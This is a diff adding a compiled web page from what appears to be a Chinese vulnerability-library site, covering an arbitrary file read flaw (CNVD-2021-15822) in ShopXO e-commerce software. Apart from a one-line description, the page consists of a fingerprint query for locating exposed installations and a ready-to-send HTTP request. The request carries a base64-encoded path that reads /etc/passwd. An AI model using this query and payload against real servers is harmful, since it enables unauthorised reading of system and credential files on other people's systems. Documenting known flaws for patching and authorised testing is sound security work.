@@ -1,0 +1,10 @@
+import{_ as i}from"./plugin-vue_export-helper-c27b6911.js";import{r as t,o as s,c as d,a as e,b as n,d as l,e as c}from"./app-58e4a7d6.js";const r={},o=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),n(" 漏洞描述")],-1),h=e("p",null,"ShopXO是一套开源的企业级开源电子商务系统。ShopXO存在任意文件读取漏洞，攻击者可利用该漏洞获取敏感信息。",-1),p=e("p",null,"参考链接：",-1),u={href:"https://www.cnvd.org.cn/flaw/show/CNVD-2021-15822",target:"_blank",rel:"noopener noreferrer"},_=c(`<h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;ShopXO企业级B2C电商系统提供商&quot;
+</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>poc：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q= HTTP/1.1
+Host: 
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,5);function v(m,x){const a=t("ExternalLinkIcon");return s(),d("div",null,[o,h,p,e("ul",null,[e("li",null,[e("a",u,[n("https://www.cnvd.org.cn/flaw/show/CNVD-2021-15822"),l(a)])])]),_])}const f=i(r,[["render",v],["__file","ShopXO 任意文件读取漏洞 CNVD-2021-15822.html.vue"]]);export{f as default};
